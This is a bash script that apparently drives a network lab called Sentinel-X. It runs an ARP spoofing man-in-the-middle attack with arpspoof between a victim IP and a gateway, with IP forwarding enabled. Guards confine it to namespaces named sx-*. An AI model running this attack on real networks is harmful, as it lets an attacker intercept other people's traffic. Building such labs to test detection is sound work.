#!/usr/bin/env bash
set -euo pipefail

# Attack script for Sentinel-X lab (§1 Rule 7 & §7 of PLAN.md)
# HARD RULE: Calls stock `arpspoof` ONLY and refuses to run unless the target
# namespace matches ^sx-.* and the target interface lives inside that namespace.

NS="${SX_ATT_NS:-sx-att}"
IFACE="${SX_ATT_IFACE:-v-att}"
VICTIM_IP="${SX_VICTIM_IP:-10.77.0.10}"
GW_IP="${SX_GW_IP:-10.77.0.1}"
DURATION="${1:-0}"

if [[ ! "$NS" =~ ^sx- ]]; then
  echo "ERROR: Refusing to run: target namespace '$NS' does not match 'sx-*'." >&2
  exit 1
fi

if [[ "$(id -u)" -ne 0 ]]; then
  echo "ERROR: lab/attack.sh must be run as root." >&2
  exit 1
fi

if ! ip netns list | awk '{print $1}' | grep -qx "$NS"; then
  echo "ERROR: Namespace '$NS' does not exist. Run 'make lab-up' first." >&2
  exit 1
fi

# Ensure the interface does NOT exist in the root/host namespace
if ip link show "$IFACE" >/dev/null 2>&1; then
  echo "ERROR: Safety guard triggered: interface '$IFACE' exists in the host namespace! Refusing to run." >&2
  exit 1
fi

# Ensure the interface exists inside the sx-* namespace
if ! ip -n "$NS" link show "$IFACE" >/dev/null 2>&1; then
  echo "ERROR: Interface '$IFACE' not found inside namespace '$NS'." >&2
  exit 1
fi

if ! command -v arpspoof >/dev/null 2>&1; then
  echo "ERROR: 'arpspoof' (dsniff package) is not installed." >&2
  exit 1
fi

ip netns exec "$NS" sysctl -w net.ipv4.ip_forward=1 >/dev/null

if [[ "$DURATION" -gt 0 ]]; then
  echo "Running arpspoof in $NS ($IFACE) targeting $VICTIM_IP <-> $GW_IP for ${DURATION}s..."
  timeout "$DURATION" ip netns exec "$NS" arpspoof -i "$IFACE" -t "$VICTIM_IP" -r "$GW_IP" >/dev/null 2>&1 || true
else
  echo "Running arpspoof in $NS ($IFACE) targeting $VICTIM_IP <-> $GW_IP (Ctrl+C to stop)..."
  exec ip netns exec "$NS" arpspoof -i "$IFACE" -t "$VICTIM_IP" -r "$GW_IP"
fi
